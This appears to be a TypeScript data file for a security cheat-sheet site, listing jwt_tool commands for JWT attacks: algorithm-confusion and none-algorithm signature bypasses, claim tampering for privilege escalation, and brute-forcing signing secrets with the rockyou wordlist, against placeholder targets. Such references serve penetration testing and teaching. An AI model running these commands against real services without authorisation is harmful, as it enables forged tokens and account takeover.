export interface JWTtoolCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const jwtToolCategories: JWTtoolCategory[] = [
  {
    category: "Installation",
    commands: [
      {
        command: "git clone https://github.com/ticarpi/jwt_tool.git && cd jwt_tool && pip3 install -r requirements.txt",
        description: "Clone repo and install Python dependencies",
      },
      {
        command: "python3 jwt_tool.py -h",
        description: "Verify installation and show help menu",
      },
    ],
  },
  {
    category: "Token Analysis",
    commands: [
      {
        command: "python3 jwt_tool.py <JWT>",
        description: "Decode and analyze a JWT token",
      },
      {
        command: "python3 jwt_tool.py eyJhbGciOiJIUzI1NiIs...",
        description: "Decode a specific JWT string",
      },
      {
        command: "python3 jwt_tool.py -t \"https://example.com\" -rc <JWT>",
        description: "Test if token is accepted by the server",
      },
      {
        command: "python3 jwt_tool.py -t \"https://example.com/api\" -rh \"Authorization: Bearer <JWT>\"",
        description: "Test token against a specific endpoint with custom header",
      },
    ],
  },
  {
    category: "Vulnerability Scanning",
    commands: [
      {
        command: "python3 jwt_tool.py -M at -t \"https://example.com\" <JWT>",
        description: "Run all available attack tests against target",
      },
      {
        command: "python3 jwt_tool.py -M pb -t \"https://example.com\" <JWT>",
        description: "Test for algorithm confusion (RS256 -> HS256)",
      },
      {
        command: "python3 jwt_tool.py -M er -t \"https://example.com\" <JWT>",
        description: "Test for signature bypass via none algorithm",
      },
      {
        command: "python3 jwt_tool.py -M pk -t \"https://example.com\" <JWT>",
        description: "Test for public key confusion",
      },
      {
        command: "python3 jwt_tool.py -M kg -t \"https://example.com\" <JWT>",
        description: "Test for key guessing (common weak secrets)",
      },
    ],
  },
  {
    category: "Token Tampering",
    commands: [
      {
        command: "python3 jwt_tool.py -T <JWT>",
        description: "Interactive tamper mode - edit claims live",
      },
      {
        command: "python3 jwt_tool.py -I -pc \"username\" -pv \"admin\" <JWT>",
        description: "Inject/override a custom payload claim",
      },
      {
        command: "python3 jwt_tool.py -I -hc \"role\" -hv \"administrator\" <JWT>",
        description: "Inject/override a custom header claim",
      },
      {
        command: "python3 jwt_tool.py -pc \"iat\" -I <JWT>",
        description: "Remove a specific claim from the payload",
      },
    ],
  },
  {
    category: "Signature Attacks",
    commands: [
      {
        command: "python3 jwt_tool.py -S hs256 -p \"secret\" <JWT>",
        description: "Resign token with HS256 using known secret",
      },
      {
        command: "python3 jwt_tool.py -S rs256 -pr private.pem <JWT>",
        description: "Sign with RS256 using private key file",
      },
      {
        command: "python3 jwt_tool.py -S none <JWT>",
        description: "Set algorithm to none (bypass verification)",
      },
      {
        command: "python3 jwt_tool.py -X a -p \"secret\" <JWT>",
        description: "Exploit algorithm confusion with known secret",
      },
    ],
  },
  {
    category: "Payload Manipulation",
    commands: [
      {
        command: "python3 jwt_tool.py -pc \"exp\" -pv \"9999999999\" <JWT>",
        description: "Set expiration claim to far-future date",
      },
      {
        command: "python3 jwt_tool.py -pc \"sub\" -pv \"1\" <JWT>",
        description: "Change subject claim to another user ID",
      },
      {
        command: "python3 jwt_tool.py -pc \"iat\" -pv \"0\" <JWT>",
        description: "Set issued-at claim to epoch 0",
      },
      {
        command: "python3 jwt_tool.py -pc \"admin\" -pv \"true\" <JWT>",
        description: "Add custom admin claim",
      },
      {
        command: "python3 jwt_tool.py -pc \"email\" -pv \"admin@target.com\" <JWT>",
        description: "Modify email claim for privilege escalation",
      },
    ],
  },
  {
    category: "Key Testing",
    commands: [
      {
        command: "python3 jwt_tool.py -C -p \"password123\" <JWT>",
        description: "Check if a specific key is correct for the token",
      },
      {
        command: "python3 jwt_tool.py -C -p \"\" <JWT>",
        description: "Check if empty string is used as signing key",
      },
      {
        command: "python3 jwt_tool.py -C -pf /usr/share/wordlists/rockyou.txt <JWT>",
        description: "Brute force secret using rockyou wordlist",
      },
      {
        command: "python3 jwt_tool.py -K -pk public.pem -t \"https://example.com\" <JWT>",
        description: "Test if public key can be used as HMAC secret",
      },
    ],
  },
  {
    category: "Quick Reference",
    commands: [
      {
        command: "-M at = All tests",
        description: "Run all available JWT attack tests",
      },
      {
        command: "-M pb = Algorithm confusion",
        description: "Test RS256 -> HS256 confusion",
      },
      {
        command: "-M er = None algorithm",
        description: "Test signature bypass with none algorithm",
      },
      {
        command: "-T = Tamper mode",
        description: "Interactive token claim editing",
      },
      {
        command: "-S = Sign token",
        description: "Resign token with specified algorithm",
      },
      {
        command: "-I = Inject claim",
        description: "Add/modify claims in payload or header",
      },
      {
        command: "-C = Check key",
        description: "Test if a key is valid for the token",
      },
      {
        command: "-p = Secret/key",
        description: "Specify secret string or key file",
      },
      {
        command: "-pr = Private key file",
        description: "Private key file for RS/ES signing",
      },
      {
        command: "-pc/-pv = Claim/value",
        description: "Set claim name and value for injection",
      },
    ],
  },
]

export const jwtToolTools = [
  {
    name: "jwt_tool GitHub",
    url: "https://github.com/ticarpi/jwt_tool",
    description: "Official repository with documentation and examples",
  },
  {
    name: "JWT.io",
    url: "https://jwt.io",
    description: "Online JWT debugger and algorithm reference",
  },
  {
    name: "Auth0 JWT Handbook",
    url: "https://auth0.com/resources/ebooks/jwt-handbook",
    description: "Comprehensive guide to JWT internals",
  },
  {
    name: "PayloadsAllTheThings - JWT",
    url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token",
    description: "JWT attack techniques and payload reference",
  },
]
